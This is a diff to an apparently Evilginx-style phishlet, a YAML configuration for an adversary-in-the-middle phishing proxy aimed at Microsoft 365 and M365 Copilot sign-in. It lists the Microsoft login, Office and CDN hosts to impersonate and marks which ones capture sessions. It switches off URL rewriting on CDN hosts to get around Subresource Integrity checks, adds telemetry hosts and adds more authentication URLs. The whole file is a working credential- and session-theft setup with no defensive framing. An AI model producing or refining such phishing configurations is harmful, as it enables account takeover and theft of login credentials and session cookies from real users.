@@ -4,33 +4,40 @@ min_ver: '3.0.0'
 redirect_url: 'https://www.office.com'
 
 proxy_hosts:
-  # Primary authentication domains
+  # Primary authentication domains - KEEP auto_filter for domain rewriting
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
   
-  # Office domains
+  # Office domains - KEEP auto_filter
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'substrate', orig_sub: 'substrate', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
   
-  # M365 Copilot domain (CRITICAL - this is where the final redirect goes)
+  # M365 Copilot domain - KEEP auto_filter
   - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false, auto_filter: true}
   
-  # CDN domains
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'res-1', orig_sub: 'res-1', domain: 'cdn.office.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'res', orig_sub: 'res', domain: 'cdn.office.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'res', orig_sub: 'res', domain: 'public.onecdn.static.microsoft', session: false, is_landing: false, auto_filter: true}
+  # CDN domains - DISABLE auto_filter to preserve SRI (Subresource Integrity)
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'res-1', orig_sub: 'res-1', domain: 'cdn.office.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'res', orig_sub: 'res', domain: 'cdn.office.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'res', orig_sub: 'res', domain: 'public.onecdn.static.microsoft', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'c', orig_sub: 'c', domain: 's-microsoft.com', session: false, is_landing: false, auto_filter: false}
   
   # Supporting domains
   - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'fpt', orig_sub: 'fpt', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fpt', orig_sub: 'fpt', domain: 'live.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'graph', orig_sub: 'graph', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'content', orig_sub: 'content', domain: 'lifecycle.office.net', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'ecs', orig_sub: 'ecs', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'lifecycle.office.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ecs', orig_sub: 'ecs', domain: 'office.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'uhf', orig_sub: 'uhf', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: false}
+  
+  # Telemetry/Analytics domains (optional but reduces console errors)
+  - {phish_sub: 'browser', orig_sub: 'browser', domain: 'events.data.microsoft.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mem', orig_sub: 'mem', domain: 'gfx.ms', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'monitor.azure.com', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
   # From login.microsoftonline.com
@@ -102,8 +109,10 @@ auth_urls:
   - '/GetCredentialType'
   - '/login'
   - '/landingv2'
+  - '/Me.srf'
+  - '/savedusers'
 
-# CRITICAL FIX: Proper login configuration with OAuth2 parameters
+# CRITICAL: Proper login configuration with OAuth2 parameters
 login:
   domain: 'login.microsoftonline.com'
   path: '/common/oauth2/v2.0/authorize'
